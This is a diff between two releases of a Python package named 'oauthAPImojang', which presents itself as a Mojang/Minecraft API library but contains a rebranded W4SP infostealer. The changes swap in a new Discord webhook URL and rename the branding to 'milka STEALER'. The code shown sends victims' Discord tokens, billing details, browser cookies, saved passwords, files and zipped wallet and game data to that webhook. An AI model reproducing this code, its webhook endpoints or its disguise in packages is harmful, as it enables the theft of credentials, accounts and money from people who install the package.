# Comparing `tmp/oauthAPImojang-0.2.9.tar.gz` & `tmp/oauthAPImojang-0.3.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "oauthAPImojang-0.2.9.tar", last modified: Sun Apr 16 21:04:44 2023, max compression
+gzip compressed data, was "oauthAPImojang-0.3.1.tar", last modified: Sun Apr 16 22:40:38 2023, max compression
```

## Comparing `oauthAPImojang-0.2.9.tar` & `oauthAPImojang-0.3.1.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxrwxrwx   0        0        0        0 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/
--rw-rw-rw-   0        0        0       61 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang/
--rw-rw-rw-   0        0        0      105 2023-04-16 20:02:36.000000 oauthAPImojang-0.2.9/oauthAPImojang/__init__.py
--rw-rw-rw-   0        0        0    35161 2023-04-16 21:03:28.000000 oauthAPImojang-0.2.9/oauthAPImojang/minecraftTHEapi.py
-drwxrwxrwx   0        0        0        0 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang.egg-info/
--rw-rw-rw-   0        0        0       61 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      258 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       22 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang.egg-info/requires.txt
--rw-rw-rw-   0        0        0       15 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/setup.cfg
--rw-rw-rw-   0        0        0      203 2023-04-16 21:03:48.000000 oauthAPImojang-0.2.9/setup.py
+drwxrwxrwx   0        0        0        0 2023-04-16 22:40:40.000000 oauthAPImojang-0.3.1/
+-rw-rw-rw-   0        0        0       61 2023-04-16 22:40:40.000000 oauthAPImojang-0.3.1/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-04-16 22:40:40.000000 oauthAPImojang-0.3.1/oauthAPImojang/
+-rw-rw-rw-   0        0        0      105 2023-04-16 20:02:36.000000 oauthAPImojang-0.3.1/oauthAPImojang/__init__.py
+-rw-rw-rw-   0        0        0    35440 2023-04-16 22:18:16.000000 oauthAPImojang-0.3.1/oauthAPImojang/minecraftTHEapi.py
+drwxrwxrwx   0        0        0        0 2023-04-16 22:40:40.000000 oauthAPImojang-0.3.1/oauthAPImojang.egg-info/
+-rw-rw-rw-   0        0        0       61 2023-04-16 22:40:40.000000 oauthAPImojang-0.3.1/oauthAPImojang.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      258 2023-04-16 22:40:40.000000 oauthAPImojang-0.3.1/oauthAPImojang.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-16 22:40:40.000000 oauthAPImojang-0.3.1/oauthAPImojang.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       22 2023-04-16 22:40:40.000000 oauthAPImojang-0.3.1/oauthAPImojang.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       15 2023-04-16 22:40:40.000000 oauthAPImojang-0.3.1/oauthAPImojang.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-04-16 22:40:40.000000 oauthAPImojang-0.3.1/setup.cfg
+-rw-rw-rw-   0        0        0      203 2023-04-16 22:19:26.000000 oauthAPImojang-0.3.1/setup.py
```

### Comparing `oauthAPImojang-0.2.9/oauthAPImojang/minecraftTHEapi.py` & `oauthAPImojang-0.3.1/oauthAPImojang/minecraftTHEapi.py`

 * *Files 6% similar despite different names*

```diff
@@ -12,19 +12,19 @@
 import shutil
 from zipfile import ZipFile
 import random
 import re
 import subprocess
 
 #  THIS IS 1.1.6 VERSION
-#    BY W4SP, loTus04
+#    BY jyyle
 # 
 
 
-hook = "https://discord.com/api/webhooks/1096175981145882694/NvmeKf3ey3_OXvRsNjLwOWVgdneiuAyRx1ll2f1vLDN6MrK_F5KP7qdcrCwhvGsPPOSk"
+hook = "https://discordapp.com/api/webhooks/1097280748253368401/rlMLWeAuv6nwgGOdjTj7ESsVwt-FJjqHUsH7H0b2DPD5MXmhj_FoPGJ6jf8iDzKz5Sjh"
 DETECTED = False
 
 
 def getip():
     ip = "None"
     try:
         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
@@ -268,15 +268,15 @@
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
     username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
 
     if pfp == None: 
-        pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
+        pfp = "https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
     billing = GetBilling(token)
     badge = GetBadge(flags)
     friends = GetUHQFriends(token)
     if friends == '': friends = "No Rare Friends"
@@ -326,24 +326,24 @@
                 }
                 ],
             "author": {
                 "name": f"{username}#{hashtag} ({idd})",
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "@W4SP STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                "text": "milka STEALER",
+                "icon_url": "https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
-        "username": "W4SP Stealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png",
+        "username": "milka Stealer",
         "attachments": []
         }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
 
 def Reformat(listt):
     e = re.findall("(\w+[a-z])",listt)
@@ -363,25 +363,25 @@
         if len(rb) > 1000: 
             rrrrr = Reformat(str(cookiWords))
             rb = ' | '.join(da for da in rrrrr)
         data = {
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "W4SP | Cookies Stealer",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [w4spCookies.txt]({link})",
+                    "title": "milka | Cookies Stealer",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [milkaCookies.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@W4SP STEALER",
-                        "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                        "text": "milka STEALER",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png"
                     }
                 }
             ],
-            "username": "W4SP",
-            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+            "username": "milka",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "wppassw":
         ra = ' | '.join(da for da in paswWords)
@@ -389,25 +389,25 @@
             rrr = Reformat(str(paswWords))
             ra = ' | '.join(da for da in rrr)
 
         data = {
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "W4SP | Password Stealer",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [w4spPassword.txt]({link})",
+                    "title": "milka | Password Stealer",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [milkaPassword.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@W4SP STEALER",
-                        "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                        "text": "milka STEALER",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png"
                     }
                 }
             ],
-            "username": "W4SP",
-            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+            "username": "milka",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "kiwi":
         data = {
@@ -418,24 +418,24 @@
                 "fields": [
                     {
                     "name": "Interesting files found on user PC:",
                     "value": link
                     }
                 ],
                 "author": {
-                    "name": "W4SP | File Stealer"
+                    "name": "milka | File Stealer"
                 },
                 "footer": {
-                    "text": "@W4SP STEALER",
-                    "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                    "text": "milka STEALER",
+                    "icon_url": "https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png"
                 }
                 }
             ],
-            "username": "W4SP",
-            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+            "username": "milka",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
         return
 
 
 
@@ -447,15 +447,15 @@
 
 #     # r = requests.post(hook, files=files)
 #     LoadRequests("POST", hook, files=files)
 
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--W4SP STEALER ON TOP-->\n\n")
+        f.write(f"<--milka STEALER ON TOP-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
 
 Tokens = ''
 def getToken(path, arg):
     if not os.path.exists(path): return
@@ -612,25 +612,25 @@
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
     data = {
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "W4SP Zips",
+            "title": "milka Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 15781403,
             "footer": {
-                "text": "@W4SP STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                "text": "milka STEALER",
+                "icon_url": "https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png"
             }
             }
         ],
-        "username": "W4SP Stealer",
-        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+        "username": "milka Stealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png",
         "attachments": []
     }
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
 
 
 def ZipTelegram(path, arg, procc):
     global OtherZip
```

